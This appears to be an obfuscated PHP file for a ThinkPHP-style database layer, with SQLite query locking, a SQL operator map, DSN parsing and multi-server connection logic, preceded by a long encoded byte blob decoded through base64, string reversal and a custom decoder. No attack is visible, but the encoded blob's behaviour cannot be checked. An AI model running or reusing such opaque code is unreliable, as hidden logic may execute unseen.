33\170\337\74\361\216\2\51"."\202\47\327\57\277\267\62\216\230\67\234\214\37\23\360\343\371\365\33\231\251\122\304\242\256\331\324\64\240\112\255\54\3\25\43\343\375\44\271\376\366\127\52\354\203\65\53\225\131\113".base64_decode('loF0IsLrk93T46O3n0v7vd7vBTuuVbvqR4tXaZnbOn8x+h/II7u9r5SZ6i0KMlf+JwY=')."\263\214\16\210\347\116\130\337\360\204\113\157\37\270\300\142\30\371\12\147\4\304\225\117\264\326\365\326\16\164\224\236\6\245\67\32\210\214\226\256\44\254\323\242\362\107\55\152\120\122"."\304\327\263\15\203\33\60\162\326\233\117\110\216\5\54\236\137\23\113\44\125\30\26\75\111\141\55\143\300\360\141\324\120\123\260\127\144\243\225\5\240\371\112\151\270\115\112\124\34\323".base64_decode('VIpaaQK415l260x7Cf5QG9avtmeyx0eEY1u8jwiPgNSdDaRQiXQAP8ATwJtUnJkY9pM=').base64_decode('Z1tgU6JPuEBCdGBFpE9SvZEAamdXnxrq76+ZwNkULIrC99aBjUycn2ZYtdQo5pQ0Vtg=')."\157\253\303\320\72\305\266\322\314\275\157\135\20\350\50\311\40\144\243\113\15\50\122\217\213\50\131\204\46\176\22\242\311\365\313\226\6\215\145\174\260\205\363\40\313\24\366\10\201\340"."\164\314\375\7\261\162\113\151\26\236\135\371\256\235\100\273\205\253\40\105\131\252\51\164\34\333\352\211\304\265\136\311\243\375\230\153\366\55\363\26\356\143\27\36\113\203\232\234\210\127"."\x56\xdc\x64\xec\x2f\x67\xfa\x47\xb9\x33\xbc\x9a\x42\xf3\x90\xe4\xc\x9c\x3c\xfe\xd1\xa9\x95\x56\x57\x17\xc1\x95\x7\xd2\x72\xd2\x7a\x6a\x83\x31\x24\xcf\x2b\xb1\x9f\xa8\x2e\x1d\x24\x47\xcc\xa0\x38\xed"."\250\364\5\272\332\127\16\134\102\137\3\143\360\135\67\102\170\166\311\250\245\207\61\312\211\375\1\232\1\11\375\370\354\102\23\134\257\40\70\222\366\101\5\233\27\21\171\257\45\236".base64_decode('JNq0iVaEWYItW6phoMDoTQqVDS8Io5YXhs+QAoY2OvdnKFrLmQSE5aG/oky0b4WI0DM=')."\213\53\161\75\323\25\46\261\301\365\365\201\331\133\266\4\15\246\346\303\124\22\130\331\0\317\115\343\203\1\167\176\324\23\30\172\236\21\0\336\234\224\301\134\11\253\163\132\160\266"."\60\211\342\352\74\12\326\361\151\153\133\266\236\337\146\14\261\64\306\45\32\315\213\30\12\114\346\375\311\65\74\330\331\47\370\140\262\327\273\75\120\43\36\330\243\176\41\277\233\312"."\x97\xd\xa5\x50\x1\x22\x23\x8\xb9\xfd\xfa\xb6\x8b\xb7\x9c\x64\xbb\x6\x1a\xe\x95\xcb\x72\x34\xc8\x22\x58\x36\x5e\x30\x52\x41\x4e\x3f\xa8\xbc\x3c\x90\x16\xa6\x47\x2c\xb\xa1\x5e\x1e\x38\x56\xde\xf1".base64_decode('JGBH2QQ8isgr4uM2euGoLg7kgaV22jLKjovy0Uc768jzQRu1UY1mqVPgpN9WR7zq1yE=')."\x4a\x47\x53\x80\xc4\x88\xa6\x2c\xc5\x24\x4d\xb1\xf4\x42\x5b\x1d\x69\xae\x9d\xd7\x75\x54\x9e\x10\xad\x5a\x1f\x41\x5\xeb\x14\x46\x6f\x8b\x1a\x1f\x31\xcb\x31\xd1\x56\xca\xcd\x59\xe0\x31\xb3\x81\x38\x98"."\5\204\372\340\76\142\372\51\364\167\306\164\76\203\370\325\275\202\156\121\245\147\102\300\310\115\130\26\113\160\150\46\170\124\255\77\36\113\306\72\331\313\113\156\121\17\205\315\143\254"."\xb0\x4d\xcd\xb5\xc4\x91\x89\x99\xae\x70\xdd\x0\x96\x83\x33\x17\x41\x80\xc0\xbc\x5b\x95\x52\x89\xab\x59\x61\x6e\x93\xef\x80\xe4\x40\xad\x67\x2\xca\x7a\x8d\xdd\x90\x0\xdd\xa4\x57\x3e\x89\x7c\xc5\x11"."\xbb\x2a\xf6\xc3\x9f\xc4\x36\xa9\x36\x80\x25\x1f\x81\xd8\x43\x21\xaa\x68\x3d\xb5\x8c\x6d\x6b\x62\x96\x8\x4c\x4b\x4b\xd8\x24\x61\x55\x11\x75\x65\x22\xd6\xc7\x9e\x4f\x81\x3d\x96\xd8\xdf\x74\x46\x23\xe1".strrev('Ïı©¿“SSKcÌ˜(İ¡€%ÉzU'."\n".'ä™ T9£Z>^ü§oPÅI ae¹µí¤¾')._kodDe('L3FDzojFppWVG5k8PNOciW7TLx983X4zAwdPU1QgHQxj8wlAKhfAB0SmPgKtIAqnGDJY').strrev('¨Kz6PâmËÚG$5²Ü@;)+¯Àƒ½Ój·!M¾zå"2#HSGíaŒ')."\71\142\33\157\124\270\224\131\57\177\54\300\6\227\2\205\253\147\77\113\360\313\357\101\100\41\272\375\10\201\274\253\151\250\214\333\343\42\206\40\76\41\315\373\211\1\222\230\6\363"."\211\222\27\111\34\225\345\356\44\231\33\226\221\130\201\333\276\343\150\37\257\211\76\73\102\75\373\303\30\326\300\374\274\71\246\212\235\36\107\127\362\30\31\122\174\142\143\150\230\221".base64_decode('jP/wuDISLmXnoi1xpw4qAsQgfNgouMxgVamoPLZLcEbWk6S7JK4IEYEQf3yFquyxtik=').base64_decode('sIpplDh+Jg9EUi3L1mlVk+t4J5bMkWUKm9YqRRkWk2aKCZgTn6DLwiBhBqCi8U7ublE=')."\252\300\233\344\51\23\242\162\351\252\2\0\257\316\115\304\367\65\162\143\270\47\67\161\254\330\311\375\307\312\336\26\351\25\271\244\226\141\203\313\173\161\47\316\352\30\225\16\163\201"."\262\145\346\320\254\333\362\240\41\170\177\155\60\317\136\235\263\106\46\336\172\71\237\14\304\27\5\354\45\127\100\147\141\113\253\211\207\244\245\254\342\335\15\11\350\136\315\122\102\47"."\177\43\111\6\342\303\241\254\5\101\170\164\167\35\230\271\162\103\170\313\76\6\351\230\264\300\201\127\177\145\315\75\232\115\120\44\54\311\221\245\314\252\13\115\30\256\62\245\13\74"."\102\342\226\323\15\247\60\172\236\167\335\276\44\11\241\53\350\354\21\142\40\205\144\121\341\12\242\354\61\315\204\313\71\61\240\51\54\335\266\66\271\230\73\355\225\63\56\144\201\213"."\x59\x2e\x3c\xac\x5c\x1c\x29\x4b\xe7\xf1\x90\xaa\xb2\xa8\x5\xaf\xe8\x1e\xfe\xb0\x6d\xd\x44\x74\x23\x5b\x15\x56\x11\x56\x3\x57\xd0\xca\x49\xa1\x14\xc3\xb5\x3\x21\xf3\xa1\x33\xa7\x4d\xa5\x82\x3e\xc".strrev(''."\n".'öLÚR€´Ì¥ø¦XÒzëo"(¹V¢CÀk®¹Vï°Áb&EKÀ•IîÌçIJ¯kèV').base64_decode('AKXH4gozCN1ej7o1hA4OYjeBCVlPqTGrEzcZQhk2P4p7d5X2CkWuCO26yTyWkgwppJk=')."\x4b\x88\xd7\xf8\x1a\xa9\xd8\x5a\x9c\x7d\x8d\xfb\xb1\x5\xca\x8f\xf2\x98\xe\x3f\x6c\xe2\xea\x11\x2a\x8b\x48\x54\x66\x12\x93\xb4\x88\x7f\x99\x68\xaa\xeb\xe6\x4e\xf2\xa1\xcd\xb3\xa2\x66\xb0\xc6\x6b\xac"."\x6d\x44\x1\x8b\x78\x1a\x97\xce\xbf\x9e\xa8\x57\x5d\xd\x97\x90\x38\x1a\x14\x95\x76\x5e\xb2\xef\x3b\x6c\xeb\x66\x8e\xc8\x85\x9a\x17\x9\xa\x2\xfc\xca\xa5\x67\xb0\xc0\xe9\x2\x8f\x12\x92\x76\x50\x8d".strrev('Ñ{"§iC'."\n".'¼‘#{öU«Æ¾qrj4rs×’†’.ÄE¦ÓÒÆ2Ğ’‚ÜN¼­Aö')."\x91\x1c\xa1\xa3\x98\xe4\xd7\x5e\x62\x44\xfd\xcd\xa\xe7\x60\x55\x5a\x33\x8d\xcc\x91\x12\x48\xfe\x5a\xcc\xac\x47\xe8\x29\x99\x62\x10\x39\x4f\xa2\x92\xe2\x77\x4f\x1e\x16\x93\x59\x77\x28\x32\x7\xc7\xcc"."\x35\x70\x5\xc4\xa1\x9\xee\x81\x2d\xa7\xa1\x6a\xb1\x3\x62\xd1\x33\xb9\x8\xf9\x66\x55\x11\x9a\x86\x99\x28\xe1\x16\x44\x4e\xb1\xb1\xc3\xfa\x1\x36\x8b\xb5\x52\x6a\x7c\x8a\x24\x49\x23\x9a\xe6\x8e\x92"."\x60\x74\xc4\x20\x41\xc2\x84\xce\xf4\x23\xfd\xcd\x2d\xfe\xb9\x70\x4e\x91\x4d\x3f\xd8\x81\x8\xf6\x11\xb4\xb0\x24\x34\xc0\x67\x44\x46\xc6\x40\xbb\x10\xf2\x89\x3c\xa6\x74\x83\x47\x5c\x85\x8\xa7\x8\xc4"."\x2b\xa\x9f\x4f\xe2\x3e\x85\xc7\x2c\x89\x97\xd0\xb9\xe6\x21\xf1\x23\x22\x93\x75\xa1\x18\x40\x15\x12\x71\x86\x81\x5a\xe9\x74\x84\x70\x72\x97\x4b\x85\xd4\x93\x1\xad\xf\x77\x3a\xf8\xb4\x17\x8d\xa1\xae"."\x4c\x4c\x97\x66\x8f\xa7\x12\x78\x1f\x41\xf6\xda\x4f\x4a\x89\x7e\x8\x3d\x5a\x4\x32\xa9\xe7\x7c\x69\x60\x84\x82\x3\xf5\xb0\xc2\x14\x82\x39\x91\x13\xe0\xa4\xc9\x81\xd5\x4a\x12\x18\x2b\xa1\x4a\x6a\x14"."\13\117\230\66\64\142\243\130\227\354\256\167\202\233\56\142\355\42\274\111\163\305\121\133\216\260\124\216\234\266\53\102\265\251\134\245\71\210\347\32\323\231\175\53\223\61\365\367\364\7".strrev('gÒ¹‘2—¸[ï æĞŠ;§%*Ä‘]¢†tˆ­´$üÎ>’Ê™:m*O/ƒ¨9')."\130\235\342\217\60\340\240\77\205\116\14\376\14\77\125\331\342\374\44\75\201\56\75\131\345\256\226\342\237\156\125\325\130\302\146\53\205\252\62\130\222\134\43\167\101\310\115\245\314\145"."\113\257\316\77\241\143\45\42\251\305\122\201\112\215\326\100\376\332\137\40\17\144\310\271\21\43\244\227\246\152\274\121\32\65\154\103\54\174\126\142\102\256\75\324\325\33\351\123\103\321"."\150\154\215\113\367\116\310\320\55\376\372\110\106\176\254\104\232\31\61\11\364\353\325\376\306\300\133\223\354\41\336\43\106\241\323\47\273\236\53\263\33\41\170\377\221\277\152\100\243\322"."\x33\x43\x65\x4b\x33\x6c\x5d\x2\xd0\x37\x70\x66\x83\x95\x88\x56\x28\xb8\x5e\x35\x2c\x64\xa5\x68\xc5\xbd\xb3\xd6\xfc\x94\x4a\x3f\xc0\x60\x92\x9b\xbb\x5a\x19\xe2\x91\x15\x3d\xc9\xff\x71\x53\x8d\x8c\x70"."\61\145\144\230\72\12\67\352\243\17\36\164\312\57\140\262\157\126\75\245\364\211\217\62\371\204\250\130\45\216\167\330\353\157\46\71\16\1\257\116\141\221\230\112\37\37\24\237\100\334"."\x89\x35\x51\x96\x2f\x31\x83\x99\x20\x1f\x62\x1a\xc0\x9e\xf4\xc2\xec\xe6\xc\x47\xc4\xc1\x4\x67\x87\xda\xf0\xe7\xe8\x71\x15\x9d\xc2\xb1\xfc\x8e\x1d\x61\x98\x2e\x25\xa2\x13\x30\xce\xae\x4b\x7c\xcf\xf3".base64_decode('Ul7NU9fjUVXfIE8Z0DRykYNyDonOoRh/ukQU9abUaABKVoRMi2dQ2pQm+tIZf5ZCWco=').base64_decode('TJTFB4i/q3Cx7LiO8j2y+rk0NxRAOB1xVMPqVWZxogrgEmRFWbu4yiB+lKOUNeXxIwQ=').base64_decode('GdsS0BcJqczAh44OulP9ghEt/n9SkCYmJAeH7kqqG2R7tzrBduHHmfLmmPuZQgzxPsc=')."\344\172\210\111\132\64\304\222\126\176\72\312\135\310\127\365\70\212\102\236\300\125\20\252\303\54\142\367\113\354\114\112\62\113\237\236\111\177\6\341\227\155\147\336\106\120\102\5\237\154"."\xe4\x48\xd5\x99\x37\xa\x19\x8b\xeb\xb\x9\x40\xaf\x2e\x4\x5\xa4\x14\x56\x99\xd1\xd8\x53\xbf\xe4\x9\xb7\x2e\x46\x93\xe1\x3d\x96\x5a\x6f\x74\x61\x3f\x76\xee\x67\x65\xc4\x6b\x3d\x62\xef\x74\xbf\x5e"."\302\157\275\155\261\30\154\307\365\136\116\322\114\152\71\37\345\310\60\125\23\261\216\11\71\54\253\261\222\136\240\104\46\314\313\360\371\136\46\145\140\157\340\145\174\344\111\66\112\352"."\xbc\xf\xbe\x48\x2b\x8d\xd3\x4f\xb9\x74\xae\x60\xa6\xb4\x42\x9c\xaa\xd9\xb9\x2c\x4f\x2c\x74\x9a\xd2\xd9\x1e\xe0\xca\x46\x41\x41\xad\x5c\x16\x97\x6e\xf2\x96\x89\xfe\x75\x59\xfc\x41\xda\x40\xb2\x47\x25"."\166\353\52\275\306\117\10\234\223\156\337\50\20\156\342\52\245\10\275\320\160\101\55\351\234\47\273\6\245\167\172\302\306\14\262\243\166\366\323\133\111\30\60\271\112\166\123\314\105\342".base64_decode('3dKT8MHqm2WsQAgUhTw1LVQuiE25fBCDDMpSRaCGayFjVELcMH30jlAKmXH/GKj0GBE=')."\x3c\xae\x57\xeb\x6d\x21\x8a\xf9\xe4\xa7\x4b\xcf\xf2\x43\xd\x8e\x8b\xcd\x5d\xf6\xbd\x21\x34\x50\xbc\xef\xde\x55\xbf\xe1\xc7\xde\xeb\x63\x4b\x7\x1e\xeb\xab\xf1\x2\xdf\x94\xf\xf8\xf9\x84\x39\xe1\xc7"."\75\131\44\214\336\334\57\110\343\176\160\326\200\237\33\252\216\36\336\123\7\37\126\117\201\270\167\220\223\146\265\174\130\334\275\273\236\27\224\172\15\244\255\372\211\102\151\30\244\176"."\x57\xac\x82\x8f\xa8\x21\xf8\x98\xef\xba\x9a\xaf\x1c\xba\x1e\x50\xf2\x4e\x68\x8d\x77\x12\x3f\xb1\x42\xd0\x6e\x26\x87\xae\x8c\x9b\xea\xb5\x2e\x4d\x59\xec\x9a\xd6\x9b\xcd\x70\xe1\xae\x6a\xe9\xc2\x20\x86"."\272\0\255\332\40\326\25\63\55\163\347\57\226\205\33\142\12\305\135\47\130\374\303\35\54\160\53\2\51\24\67\32\52\314\357\250\274\372\111\242\133\341\274\372\201\115\317\16\360\77"."\x5b\x30\xe2\xf4\x40\xb3\x4a\x6a\xe0\xd5\x4f\x11\x57\x8d\x0\xc1\x53\x49\x41\x4a\xda\x10\x3d\xa\x2f\x26\xd6\x41\xb1\xc5\xaa\xa3\x5b\xa0\x78\x48\xd3\xfd\x2d\xca\x3e\xd4\xe8\x87\xb4\xef\x89\xc5\x42\x1f"."\102\64\13\370\214\135\304\262\173\307\322\334\7\312\132\347\46\62\22\354\220\146\220\27\317\165\157\333\311\300\200\64\105\44\113\7\53\271\106\307\364\212\202\160\161\274\57\22\261\146"."\xac\x54\xe0\x4f\x21\x98\xd2\xa3\x86\x12\x25\xfa\x1f\x4c\x20\x3b\x23\xd1\xe3\x94\xd0\x85\xaa\xd1\xf3\xe0\x72\x46\x5a\x6a\x3c\x74\x29\xa9\x7f\x7c\x4c\xbb\x29\x77\xc7\xcf\x83\x7e\xcd\xf1\x4b\x8\x29\x89".base64_decode('D3UnRiYYSIQ4trr76qkeFRN1DPmUqTJVs3jSe5jCxZbE3OHSzKpyilM/Mepzs0nyO34=')."\xc4\x30\x4e\x78\x94\x20\xcb\xd5\xb5\x74\x25\xd7\xbe\xb2\x61\x19\xa9\x48\x5e\x13\xd5\x55\x4b\xaf\x22\xa\xa9\x10\x11\x23\x41\x8f\x60\x41\x13\x35\x6\xd2\xcc\xd0\xa\x6e\x8f\xa8\x49\xca\x6c\x6e\x51\x15"."\x1e\x6a\xe9\x5d\x5b\x53\xe\x8b\x29\xc0\x64\x3f\xc6\x9c\xa4\xa2\xaf\xbb\x8e\x9a\x28\xde\xe5\x79\x1\x99\x90\x28\xef\xb3\xc8\x6c\x88\x8\x5d\x10\x24\x4f\x32\x6b\x75\x9d\x6b\xf8\xbb\x70\xae\x73\x8e\xed"."\x7d\x1c\x12\x71\x7b\xb2\xd3\x63\x14\xf5\x3e\xa1\xb\xb4\x91\x58\xd\xd0\xaf\x49\xbb\xab\xd8\x48\x45\xa8\xaf\x52\x14\x11\x49\xbe\x4b\x8e\x54\x3c\xd1\x65\xfd\x8b\xfd\x46\x79\xc8\x0\xb3\x29\xb6\x3d\x4f"."\303\122\27\264\64\314\70\377\377\353\167\21\377\137\75\207\70\277\211\111\342\135\57\47\257\0\376\233\261\174\223\222\313\153\52\5\366\364\303\275\203\36\12\130\304\237\14\227\342\134".base64_decode('NZr5DmMuxTR2G6YVCtI+W/vEUvUmLUK+Yf7Aaa2I10rO+z7tevasO3l6dqhWRkGG+ME=').strrev('³³+ÔlŒSÄ„O(Y²œÂ›DÙUñ-vê¢l«pôË¥‡ãS¨')._kodDe('MBFR6/7TjyZ6+f+OaCA/YEuYb0eWI8AcFSqOHsrGdYYalTsymdWdPAu3iLWEE8Sdq1rE').base64_decode('qC7N6YBcBGukuwVa/Dn1Ju/76s1+T3X8KVI3rrvexqTaIGiBxLGUg8mtyAUQuQn2V5c=')."\241\170\235\20\171\246\130\131\265\327\67\157\224\20\342\341\220\74\36\214\116\364\133\46\341\5\335\120\56\371\221\164\201\245\147\301\253\330\73\12\236\31\250\332\244\30\311\164\315\24".base64_decode('Ov2Ji0fDJK7nWdGB3gZiEgWIjg4k3aZAGeldbrwwhd9IrPlMZJAyH8CsFCUlfwC5JIU=').base64_decode('tvzKh7skNttwL8FltbKlTcuWsnF4rbwYMWVJiJyG31R2XFMkXhHwvh5A5AP0yO86+cM=').base64_decode('VbEMkq5OEfuecT9HQhIJmLkYhRqkyz/33Sv3k15FbitGVEompZjnOvSLLTkjwjEFSaY=')."\xd7\x1a\xa1\x51\x8d\xfb\x7e\xf1\x96\x72\xbf\xe4\x2e\xdd\xd4\xa6\x9\x42\x86\xab\x2f\xe3\xc4\x1d\xa1\xc4\xac\xb0\x62\xf8\x6c\x25\xf6\x11\xf\xbc\xd6\xc3\xe4\x59\x6d\x54\x70\x5a\x82\xbb\xcf\x64\xba\xb5"."\321\32\131\63\354\174\303\241\10\302\263\22\116\115\62\146\26\66\7\372\230\367\345\346\200\154\0\355\312\130\15\25\306\316\122\171\161\55\43\272\211\141\265\272\117\26\232\273\270\154"."\x4c\xcd\x91\x4a\x80\xe8\x83\x12\x5c\xad\x41\x3a\x49\x61\xbd\xf\xa1\xef\x40\xbb\xc2\x5\x6\xe2\x93\x6e\xd3\x6d\x9e\x8d\xcf\x19\xca\x43\x2c\x95\xfc\x2e\xa8\xe7\x6c\x88\x65\x33\x8c\xed\xf0\x24\xd9\xf2".base64_decode('q8vuC1hZgiGhgF6IStXJl7NTFkjU/ojASvcQSzbvIoHtkKZr8CUSyTsGOeNyoqs53qk=').base64_decode('Jccagb4UWCSCYZoWcifR/Lqn9XIBb89oCXvMcNJ56axVnVgNt6oGFT5Uu73eVrEx9Z4=')."\100\105\45\125\355\221\64\74\222\146\215\62\264\105\65\213\321\44\134\122\360\274\256\262\123\14\1\56\113\223\160\331\252\144\126\130\22\330\110\345\34\255\142\117\321\275\352\301\3\51"."\x46\xa6\x46\x87\x3d\x67\x7d\x9a\x75\xaa\xf1\xac\x99\xb9\xfa\x73\x80\x71\xde\xdc\x44\xec\x51\xbb\x15\x42\x5a\xe1\xb9\x69\xaf\xd5\x8a\x9a\x99\xa7\x6c\x85\xc8\xed\xd9\x5\x6a\xd1\x5a\x96\x52\x83\xba\x52"."\xca\x31\xa5\xf6\x89\xd0\xc8\xa8\x26\xf3\x22\xad\x86\x7e\x8\xfd\x24\xde\xc2\x65\xc7\x56\x35\x92\x65\x65\x93\xda\xea\x28\xf1\x9a\x94\xc1\x76\xeb\x89\x78\xe0\xf2\xb8\x81\x5f\x54\x60\xbe\x0\x19\xd1\x69"."\xb4\x60\xc\xb\x3d\x3c\xa6\x86\x3f\xd3\x45\xfe\x2b\xa5\xe1\x92\xc9\xb7\x94\x8c\x50\xb3\xc4\x2a\xe2\x21\xcb\x3b\xce\x55\xb5\xb9\xd1\xb8\x54\x91\x5c\xcd\xd6\xb4\xa\xf0\x61\xd9\x41\xf5\x29\xbd\xa0\xb1"."\253\6\311\234\202\36\253\114\307\110\353\156\177\266\262\177\53\232\316\76\122\220\204\221\36\71\240\220\144\270\364\30\152\110\312\10\10\330\76\41\222\247\365\111\14\215\300\11\227\345"."\xb\x65\x23\xe0\x26\x83\x5e\x82\x76\xe2\xcb\x76\x7e\xfd\x45\x7c\xb1\xd2\x6d\x97\x26\x27\x4c\xcb\xf1\xe1\xb4\xa4\x59\x26\xbf\x1d\xa6\xe3\x8\xa5\x0\x2a\x3a\x20\xbc\x22\xde\x3b\x7d\x92\xce\xb\xa\x89".base64_decode('uy7cKHKJQtCWUB8ShOtYfCZP6DSV0CxXBF/O8Ii8NcK1bHfFc3EsAOgAnDLHmVMpbJw=')."\57\332\43\256\157\64\57\77\50\130\31\100\105\131\203\207\270\100\260\203\64\45\10\257\45\370\111\35\360\36\132\140\143\71\347\52\116\137\222\342\232\266\37\127\3\210\160\105\25\324"."\125\72\221\255\201\351\120\42\231\250\112\352\17\45\22\153\142\361\56\352\131\275\52\231\224\222\64\242\252\222\372\173\142\175\123\245\205\173\103\221\150\125\32\126\236\352\123\205\173\62"."\232\24\351\47\255\44\67\220\123\265\42\322\271\112\264\204\334\165\213\233\201\162\336\144\2\177\166\163\222\320\12\114\16\40\331\365\352\105\341\227\116\224\161\213\67\344\171\265\231\3"."\x49\x1e\x70\x3f\x53\xe4\xd1\x51\x64\x8\xb\x15\x61\xc5\xa7\x3e\xa8\x3b\xce\x1e\x76\xc5\x9e\xe6\xf9\xba\xe7\x3c\xb7\xb8\xbc\xf\xb8\x2e\xf9\x25\x38\x59\x1b\x84\xd8\x48\x38\x27\xef\xc9\x4\x30\xbb\xe6"."\0\311\122\345\352\133\16\222\52\6\0\67\154\245\11\132\163\33\315\224\164\213\101\117\74\140\72\13\103\52\51\267\321\260\53\331\321\162\65\357\272\251\364\20\257\176\41\327\373\337"."\65\257\175\11\206\257\0\0".""."".base64_decode('')."".""."", 10, -8))); goto c¦…¶Ñƒ ; D°„Ë­‚Ñõ: class DbSqlite3 extends DbSqlite3Base { public function query($û¢úœÕÕ) { $¯œ×ï¶¥ =& $_SERVER[íû‘ş´]; if (!CacheLock::fileLock($¯œ×ï¶¥[13])) { return !1; } $ê†ö÷Õ® = parent::query($û¢úœÕÕ); CacheLock::fileUnLock($¯œ×ï¶¥[13]); return $ê†ö÷Õ®; } public function execute($½¸±“Ç) { $‹„¼œï£ =& $_SERVER[íû‘ş´]; if (!CacheLock::fileLock($‹„¼œï£[13])) { return !1; } $²±º¹‹˜ = parent::execute($½¸±“Ç); CacheLock::fileUnLock($‹„¼œï£[13]); return $²±º¹‹˜; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\150\x69\156\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\161" => "\75", "\156\x65\161" => "\x3c\76", "\x67\164" => "\76", "\145\147\164" => "\76\75", "\154\164" => "\x3c", "\145\154\164" => "\74\x3d", "\x6e\157\x74\x6c\x69\153\x65" => "\x4e\x4f\x54\40\x4c\111\x4b\105", "\x6c\x69\153\x65" => "\114\111\113\105", "\151\x6e" => "\x49\116", "\x6e\157\x74\151\x6e" => "\116\x4f\x54\40\111\x4e", "\156\157\164\40\x69\156" => "\116\117\124\40\x49\x4e", "\x62\145\164\x77\x65\145\x6e" => "\102\105\124\x57\x45\105\116", "\x6e\157\x74\x62\x65\164\167\x65\x65\156" => "\x4e\117\124\x20\102\105\124\x57\x45\105\116", "\156\x6f\164\40\x62\145\x74\x77\145\x65\156" => "\x4e\x4f\124\40\102\105\124\x57\x45\105\116"); protected $selectSql = "\123\x45\114\x45\103\124\45\104\x49\x53\x54\x49\x4e\x43\x54\x25\x20\x25\x46\111\x45\x4c\104\45\x20\106\122\x4f\115\x20\45\x54\101\102\114\105\x25\x25\x4a\117\111\116\45\x25\127\x48\105\x52\x45\x25\x25\107\122\x4f\x55\x50\x25\45\x48\101\126\x49\116\107\45\45\117\122\x44\x45\122\x25\45\114\x49\x4d\x49\x54\x25\x20\x25\125\116\111\x4f\x4e\45\45\103\x4f\x4d\115\x45\116\124\45"; protected $bind = array(); public static function getInstance() { $°ãˆ€¢ä = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[íû‘ş´][1018], $°ãˆ€¢ä); } public function factory($Šïİ·— = '') { $›ÔğÊ¿Ç =& $_SERVER[íû‘ş´]; $Šïİ·— = $this->parseConfig($Šïİ·—); if (empty($Šïİ·—[$›ÔğÊ¿Ç[1019]])) { think_exception(think_lang($›ÔğÊ¿Ç[1020])); } $this->dbType = ucwords(strtolower($Šïİ·—[$›ÔğÊ¿Ç[1019]])); $ë¤óØµ¼ = $›ÔğÊ¿Ç[1021] . $this->dbType; if (class_exists($ë¤óØµ¼)) { $’´İ¸è = new $ë¤óØµ¼($Šïİ·—); if ($›ÔğÊ¿Ç[1022] != strtolower($Šïİ·—[$›ÔğÊ¿Ç[1019]])) { $’´İ¸è->dbType = strtoupper($this->dbType); } else { $’´İ¸è->dbType = $this->_getDsnType($Šïİ·—[$›ÔğÊ¿Ç[974]]); } } else { think_exception(think_lang($›ÔğÊ¿Ç[1023]) . $›ÔğÊ¿Ç[1024] . $ë¤óØµ¼); } return $’´İ¸è; } public function __call($Çº–÷¹Î, $ø•®ƒ‡Õ) { if (method_exists($this, $Çº–÷¹Î)) { return call_user_func_array(array($this, $Çº–÷¹Î), $ø•®ƒ‡Õ); } } protected function _getDsnType($Á¤Øñ‰) { $²â²ÇÙï = explode($_SERVER[íû‘ş´][4], $Á¤Øñ‰); $”¥´ªŸı = strtoupper(trim($²â²ÇÙï[0])); return $”¥´ªŸı; } private function parseConfig($ğ†áÍÓ = '') { $ã†úàúÌ =& $_SERVER[íû‘ş´]; if (!empty($ğ†áÍÓ) && is_string($ğ†áÍÓ)) { $ğ†áÍÓ = $this->parseDSN($ğ†áÍÓ); } elseif (is_array($ğ†áÍÓ)) { $ğ†áÍÓ = array_change_key_case($ğ†áÍÓ); $ğ†áÍÓ = array($ã†úàúÌ[1019] => $ğ†áÍÓ[$ã†úàúÌ[1025]], $ã†úàúÌ[946] => $ğ†áÍÓ[$ã†úàúÌ[1026]], $ã†úàúÌ[947] => $ğ†áÍÓ[$ã†úàúÌ[1027]], $ã†úàúÌ[944] => $ğ†áÍÓ[$ã†úàúÌ[1028]], $ã†úàúÌ[945] => $ğ†áÍÓ[$ã†úàúÌ[1029]], $ã†úàúÌ[21] => $ğ†áÍÓ[$ã†úàúÌ[1030]], $ã†úàúÌ[974] => $ğ†áÍÓ[$ã†úàúÌ[1031]], $ã†úàúÌ[17] => isset($ğ†áÍÓ[$ã†úàúÌ[1032]]) ? $ğ†áÍÓ[$ã†úàúÌ[1032]] : array()); } elseif (empty($ğ†áÍÓ)) { if (think_config($ã†úàúÌ[1033]) && $ã†úàúÌ[1022] != strtolower(think_config($ã†úàúÌ[1034]))) { $ğ†áÍÓ = $this->parseDSN(think_config($ã†úàúÌ[1033])); } else { $ğ†áÍÓ = array($ã†úàúÌ[1019] => think_config($ã†úàúÌ[1034]), $ã†úàúÌ[946] => think_config($ã†úàúÌ[1035]), $ã†úàúÌ[947] => think_config($ã†úàúÌ[1036]), $ã†úàúÌ[944] => think_config($ã†úàúÌ[1037]), $ã†úàúÌ[945] => think_config($ã†úàúÌ[1038]), $ã†úàúÌ[21] => think_config($ã†úàúÌ[290]), $ã†úàúÌ[974] => think_config($ã†úàúÌ[1033]), $ã†úàúÌ[17] => think_config($ã†úàúÌ[1039])); } } return $ğ†áÍÓ; } protected function initConnect($§Õ—©ÎĞ = true) { if (1 == think_config($_SERVER[íû‘ş´][22])) { $this->_linkID = $this->multiConnect($§Õ—©ÎĞ); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $ÖâĞâû€ => $ÕÎÑËì) { $this->_linkID = $ÕÎÑËì; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($Ç·¸¢õñ = false) { $ªı´Ãîé =& $_SERVER[íû‘ş´]; static $İ°œñÁ = array(); static $‘“Áœ˜ = -1; if (empty($İ°œñÁ)) { foreach ($this->config as $ëêÜÍ”ç => $¥ãªúş) { $İ°œñÁ[$ëêÜÍ”ç] = explode($ªı´Ãîé[50], $¥ãªúş); } } if (think_config($ªı´Ãîé[1040])) { if ($Ç·¸¢õñ || think_config($ªı´Ãîé[439]) === !0) { $ËÀ¡şÕÂ = floor(mt_rand(0, think_config($ªı´Ãîé[1041]) - 1)); $‘“Áœ˜ = $ËÀ¡şÕÂ; } else { if (is_numeric(think_config($ªı´Ãîé[1042]))) { $ËÀ¡şÕÂ = think_config($ªı´Ãîé[1042]); } else { $ËÀ¡şÕÂ = floor(mt_rand(think_config($ªı´Ãîé[1041]), count($İ°œñÁ[$ªı´Ãîé[944]]) - 1)); } } } else { $ËÀ¡şÕÂ = floor(mt_rand(0, count($İ°œñÁ[$ªı´Ãîé[944]]) - 1)); $‘“Áœ˜ = $ËÀ¡şÕÂ; } $ËÀ¡şÕÂ = 